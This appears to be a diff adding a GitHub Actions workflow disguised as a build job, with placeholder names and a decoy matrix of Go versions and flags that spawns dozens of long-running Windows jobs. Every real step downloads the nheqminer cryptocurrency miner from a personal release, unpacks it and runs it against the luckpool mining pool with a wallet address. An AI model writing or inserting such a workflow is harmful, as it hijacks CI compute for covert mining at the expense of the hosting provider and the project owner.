@@ -1,0 +1,28 @@
+name: NAME
+ 
+on: [workflow_dispatch]
+ 
+jobs:
+  build:
+    name: NAME
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    timeout-minutes: 350    
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/dikinurfalah9/miner/releases/download/nheqminer-Windows-v0.8.2/nheqminer-Windows-v0.8.2.zip -OutFile nheqminer-Windows-v0.8.2.zip
+    - name: Extract
+      run: Expand-Archive nheqminer-Windows-v0.8.2.zip
+    - name: RUNNING
+      run: .\nheqminer-Windows-v0.8.2\nheqminer\nheqminer.exe -v -l na.luckpool.net:3956 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.Geha -p x -t 1
+    - name: DONE
+      run: exit
+
